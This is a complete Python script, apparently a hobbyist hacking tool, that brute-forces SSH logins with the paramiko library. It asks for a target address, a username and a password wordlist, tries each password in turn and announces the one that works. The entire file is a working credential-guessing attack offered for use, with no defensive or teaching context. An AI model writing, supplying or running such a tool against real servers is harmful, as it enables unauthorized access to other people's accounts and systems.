import paramiko, termcolor , sys, os, socket

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=22, username=username, password=password, timeout=30)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error as e:
        code = 2
    ssh.close()
    return code


host = input("[+] Enter target address you want to Bruteforce: ")
username  = input("[+] Input SSH Username you want to attack: ")
input_file =  input("[+] Input the path to the password file: ").strip()

if os.path.exists(input_file) == False:
    print("!!!! That file path does not exists")
    sys.exit(1)

with open(input_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        try:
            response = ssh_connect(password)
            if response == 0:
                print(termcolor.colored(("Found Password " + str(password )+ "  For Account :" + username ), 'green'))
                break
            elif response == 1:
                print(termcolor.colored(("[-] Incorrect Login " + password), 'red'))

            elif response == 2:
                print("[-] Can't Connect")
        except Exception as e:
            print(e)
            pass
